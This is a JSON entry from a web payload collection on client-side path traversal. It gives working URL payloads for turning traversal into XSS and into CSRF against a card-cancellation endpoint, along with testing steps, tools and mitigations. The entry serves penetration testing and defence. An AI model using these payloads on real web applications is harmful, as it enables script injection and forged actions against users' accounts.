{
  "id": "payload_000017",
  "important": {
    "title": "Client-Side Path Traversal (CSPT) / CSPT2CSRF",
    "category": "Web Vulnerabilities",
    "sub_category": "Client-Side Path Traversal",
    "tags": ["CSPT","CSRF","XSS","path-traversal","client-side"],
    "targets": { "os": ["Any"], "system": ["Browser","Web App"] },
    "risk": "high"
  },
  "variants": [
    {
      "match": { "os": ["Any"], "system": ["CSPT to XSS"] },
      "payload": {
        "explanation": "Inject ../ sequences in fetch URLs to redirect requests and execute arbitrary JS, enabling XSS.",
        "code": "https://example.com/static/cms/news.html?newsitemid=../pricing/default.js?cb=alert(document.domain)//",
        "run_context": "Injected in URL parameters processed by frontend fetch functions.",
        "placeholders": { "NEWSITEM_ID": "../pricing/default.js?cb=alert(document.domain)" },
        "notes": "Vulnerable when input is not normalized or properly encoded."
      }
    },
    {
      "match": { "os": ["Any"], "system": ["CSPT to CSRF"] },
      "payload": {
        "explanation": "Redirect legitimate requests via CSPT to include necessary CSRF tokens or authentication, bypassing CSRF protections.",
        "code": "https://example.com/signup/invite?email=foo%40bar.com&inviteCode=123456789/../../../cards/123e4567-e89b-42d3-a456-556642440000/cancel?a=",
        "run_context": "Front-end request manipulation using ../ sequences to access sensitive endpoints.",
        "placeholders": { "PATH_MANIPULATION": "../../../cards/<card-id>/cancel?a=" },
        "notes": "Works with GET/POST endpoints depending on CSRF token enforcement and SameSite cookie flags."
      }
    }
  ],
  "usage": {
    "steps": [
      "Identify vulnerable fetch endpoints in frontend JS code.",
      "Craft payloads using ../ sequences to redirect or fetch unauthorized resources.",
      "Test for XSS by injecting JS in reachable parameters.",
      "Test for CSRF bypass using CSPT2CSRF payloads with GET or POST endpoints.",
      "Verify using test accounts to avoid impacting real users."
    ],
    "tools": ["doyensec/CSPTBurpExtension","Browser devtools"],
    "required_params": {
      "target_url": { "required": true, "example": "https://example.com/static/cms/news.html" },
      "payload_param": { "required": true, "example": "newsitemid" }
    },
    "code_samples": [
      {
        "title": "CSPT to XSS",
        "description": "Inject path traversal to execute JS via cb parameter.",
        "code": "https://example.com/static/cms/news.html?newsitemid=../pricing/default.js?cb=alert(document.domain)//",
        "run_context": "browser"
      },
      {
        "title": "CSPT2CSRF example",
        "description": "Redirect legitimate requests to sensitive endpoint using ../",
        "code": "https://example.com/signup/invite?email=foo%40bar.com&inviteCode=123456789/../../../cards/<card-id>/cancel?a=",
        "run_context": "browser"
      }
    ],
    "mitigations": [
      "Normalize and validate all URL/path inputs on frontend and backend.",
      "Use strict CSRF tokens and SameSite cookies.",
      "Avoid relying solely on client-side request enforcement."
    ],
    "references": [
      "Exploiting Client-Side Path Traversal to Perform Cross-Site Request Forgery - Maxence Schmitt, Jul 2024",
      "Exploiting Client-Side Path Traversal - CSRF is Dead, Long Live CSRF - Maxence Schmitt, Jul 2024",
      "OWASP CSPT Resources",
      "doyensec/CSPTPlayground"
    ]
  },
  "system": { "version": "2.0.0", "source": "PayloadsAllTheThings" }
}
